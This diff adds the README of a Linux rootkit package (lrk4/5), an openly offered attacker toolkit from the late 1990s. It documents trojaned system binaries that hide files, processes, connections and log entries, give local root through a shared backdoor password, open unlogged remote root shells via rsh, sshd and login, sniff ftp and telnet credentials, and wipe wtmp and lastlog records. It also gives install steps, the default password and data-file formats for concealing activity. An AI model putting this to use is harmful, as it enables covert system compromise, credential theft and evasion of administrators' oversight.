@@ -1,0 +1,236 @@
+yeh well proggy put a gadget or two in here
+
+##################################################################################################################################
+
+-stuff i added in 5.0
+ (btw, excuse me for not being as organized as ls)
+
+ - backdoored sshd-2.0.13
+ - better sniffer
+ - backdoored su
+ - better crontab (imo)
+
+   give this to whoever, i dont give fucks
+
+
+Lord Somer is extremely pleased to bring you..
+ _     _                    ____             _   _    _ _     ___ ___      ___
+| |   (_)_ __  _   ___  __ |  _ \ ___   ___ | |_| | _(_) |_  |_ _|\  \    /  /
+| |   | | '_ \| | | \ \/ / | |_) / _ \ / _ \| __| |/ / | __|  | |  \  \  /  /
+| |___| | | | | |_| |>  <  |  _ < (_) | (_) | |_|   <| | |_   | |   \  \/  /
+|_____|_|_| |_|\__,_/_/\_\ |_| \_\___/ \___/ \__|_|\_\_|\__| |___|   \____/
+         Released November 26, 1998 "for turkeyday this year I bring you Linux Rootkit 4"
+UPDATES
+4.0
+ - new pidof/killall trojan by Lord Somer
+ - new find trojan, by Lord Somer with help from Loki(thanks man, that code was a bitch)
+ - new trojaned crontab, removed logging and now uses a file to read
+    in the secret crontab entries
+ - linsniffer modified to stop logging for pop2/pop3, because who wants 60k of some gimp checking
+    his mail?  We want ftp/shells
+ - sniffchk program to check if your sniffer is up and running, good if you use it along with our
+    trojaned crontab and ps, nice and easy invisible logging
+ - updated makefiles
+ - documentation is in alphabetical order now
+ - changed default pass to satori
+ - Compiled it on the only box that ever did it successfully(for precompiled versions only)
+
+UPDATES
+3.0	Released 25/12/96
+	Everything updated with lastest sources for 2.X kernel. 
+	Added shadow support.
+	Added trojan tcp wrappers.
+	Removed sniffit and lled.
+	Improved lots of stuff.
+
+This packages includes the following:
+
+bindshell	port/shell type daemon!
+chfn		Trojaned! User->r00t
+chsh		Trojaned! User->r00t
+crontab         Trojaned! Hidden Crontab Entries
+du		Trojaned! Hide files
+find		Trojaned! Hide files
+fix		File fixer!
+ifconfig	Trojaned! Hide sniffing
+inetd		Trojaned! Remote access
+killall		Trojaned! Wont kill hidden processes
+linsniffer	Packet sniffer!
+login		Trojaned! Remote access
+ls		Trojaned! Hide files
+netstat		Trojaned! Hide connections
+passwd		Trojaned! User->r00t
+pidof		Trojaned! Hide processes
+ps		Trojaned! Hide processes
+rshd		Trojaned! Remote access
+sniffchk	Program to check if sniffer is up and running
+syslogd		Trojaned! Hide logs
+tcpd		Trojaned! Hide connections, avoid denies
+top		Trojaned! Hide processes
+wted		wtmp/utmp editor!
+z2		Zap2 utmp/wtmp/lastlog eraser!
+		
+INSTALLATION
+To install this kit in its standard form execute 'make all install'.
+To install the shadow kit execute 'make shadow install'.
+The crontab trojan is not installed by default, it is compiled by default though.
+Please read the documentation in the cron3.0pl1 dir for installation of it.
+This version is for vixie crontab only, another version for dillon crontab will be out soon.
+Vixie is the default redhat crontab and dillon is the default slackware.
+All of the files/password configuration is in rootkit.h so feel free to
+personalise your own version of lrk4. This kit is for linux 2.X kernels 
+ONLY so don't complain when nothing works on old systems. 
+If any customizations you make you deem to be quite significant or would be helpfull to the rest
+of us please mail them to webmaster@lordsomer.com along with any other suggestions you might
+have.
+
+USAGE
+OK I will go thru how to use each program one by one. NOTE when I say password
+I mean the rootkit password not your users password (doh!). By default the
+rootkit password is satori.
+
+chfn -		Local user->root. Run chfn then when it asks you for a new name
+		enter your password.
+
+chsh -		Local user->root. Run chsh when it asks you for a new shell
+		enter your password.
+
+crontab -	Loads a file defined as TAB_NAME in rootkit.h, by default /dev/hda02
+		This file should have the following syntax:
+		username regularcrontabentry
+		ie: say to run your botchk for your hidden eggdrop as user hack you'd use:
+		hacker 0,10,20,30,40,50 * * * *   /home/hack/eggdrop1.1.5/botchk >/dev/null 2>&1
+
+                NOTE: the user must already have a crontab, do crontab -lu username
+                      to see if they have one
+
+du -		See documentation for ls
+
+find -		See documentation for ls
+
+fix -		Replaces and fixes timestamp/checksum infomation on files.
+
+
+ifconfig -	Modified to remove PROMISC flag when sniffing.
+
+inetd -		Don't even *think* about asking ;-) It ain't that hard..
+
+killall -	All process of type 2 and 3 in the ROOTKIT_PROCESS_FILE cant be killed using 
+		killall.
+		say our process file had this in it:
+        	2 linsniffer
+		3 hack
+		if you typed killall linsniffer, it wouldn't kill any process with the fullname
+		of linsniffer, but if you typed killall somehackerprogs it wouldn't kill any 
+		process with hack in it.  See ps for more information as they run on the same
+		list, along with the pidof trojan.
+
+linsniffer -	A great packet sniffer, very simple to use just run: ./linsniffer > tcp.log &
+		Come back in a few hours and read your logs of ftps/imaps/telnets :)
+		Some other sniffers if you want more configurability are:
+		Sniffit: http://reptile.rug.ac.be/~coder/sniffit/sniffit.html
+
+login -		Allows login to any account with the rootkit password.
+		If root login is refused on your terminal login as "rewt".
+		Disables history logging when backdoor is used.
+
+ls -		Trojaned to hide specified files and dirs.
+		The data file is ROOTKIT_FILES_FILE, defaults to /dev/ptyr.
+		All files can be listed with 'ls -/' if SHOWFLAG is enabled.
+		(see rootkit.h)
+		The format of /dev/ptyr is:
+		ptyr
+		hack.dir
+		w4r3z
+		ie. just the filenames. This would hide any files/dirs with the
+		names ptyr, hack.dir and w4r3z.
+
+netstat -	Modified to remove tcp/udp/sockets from or to specified
+		addresses, uids and ports. The file is ROOTKIT_ADDRESS_FILE.
+		default data file: /dev/ptyq
+		type 0: hide uid
+		type 1: hide local address
+		type 2: hide remote address
+		type 3: hide local port
+		type 4: hide remote port
+		type 5: hide UNIX socket path
+
+		example:
+		0 500           <- Hides all connections by uid 500
+		1 128.31        <- Hides all local connections from 128.31.X.X
+		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
+		3 8000          <- Hides all local connections from port 8000
+		4 6667          <- Hides all remote connections to port 6667
+		5 .term/socket  <- Hides all UNIX sockets including the path 
+				   .term/socket
+
+passwd -	Local user->root. Enter your rootkit password instead of your
+		old password.
+
+pidof -		Uses ROOTKIT_PROCESS_FILE, just like ps and killall do.
+		pidof (some command name) normally returns the pid or pids of that command.
+		Any process of type 2 or 3 in our file will be hidden just like in ps, see ps
+		documentation for more information.
+		NOTE: programs that run from scripts like a bash script use the name of the
+		      script to hide it not the item it runs!  IE: eggdrop config files instead
+		      of eggdrop ./config.file
+
+ps -		Modified to remove specified processes.
+		The file used is ROOTKIT_PROCESS_FILE, default to /dev/ptyp.
+		An example data file is as follows:
+
+        	0 0             Strips all processes running under root
+        	1 p0            Strips tty p0
+        	2 sniffer       Strips all programs with the name sniffer
+		3 hack		Strips all programs with 'hack' in them 
+				ie. proghack1, hack.scan, snhack etc.
+		Don't put in the comments, obviously. Note: if this doesn't 
+		seem to work make sure there are no spaces after the names, 
+		and don't use the full path name.
+		NOTE: programs that run from scripts like a bash script use the name of the
+		      script to hide it not the item it runs!  IE: eggdrop config files instead
+		      of eggdrop ./config.file
+
+
+rshd -		Execute remote commands as root. 
+		Usage: rsh -l rootkitpassword host command
+		ie. rsh -l satori cert.org /bin/sh -i
+		    would start a root shell.
+
+sniffchk -	simple bash scrip to check if your linsniffer is running, not really necessary
+		unless you setup your system to mail you the logs and you dont want to ever log
+		in manually to read them, but how long do u really wanna sniff the same servers?
+
+sshd - 		this is cool, alphabetical order.  Ok, now just do ssh -l
+		rewt <host> and it wont be logged, do ssh -l <any login> <host>
+		and it will be logged.  Use the rootkit password for a
+		password
+
+syslogd -	Modified to remove specified strings from logging.
+		The data file is ROOTKIT_LOG_FILE, this defaults to /dev/ptys.
+		Example data file:
+
+		evil.com
+		123.100.101.202
+		rshd
+		This would remove all logs containing the strings evil.com,
+		123.100.101.202 and rshd.
+
+tcpd -		Modified to allow access from your host without any logging. 
+		Any type 1 record in the ROOTKIT_ADDRESS_FILE is used for 
+		tcpd. See netstat for more infoz on this file.
+		Example data file:
+		1 123.4.5.6
+		would set up the tcp wrappers to allow and hide connects from 
+		123.4.5.6.
+
+top -		Identical to ps.
+
+wted -		This does lots of stuff. U can view ALL the entries in a wtmp
+		or utmp type file, erase entries by username or hostname,
+		view zapped users (admins use a util similar to this to find
+		erased entries), erase zapped users etc.
+
+z2 -		Zapper2! Run this to erase the last utmp/wtmp/lastlog entries
+		for a username. This can be detected since it just nulls the
+		entry out.
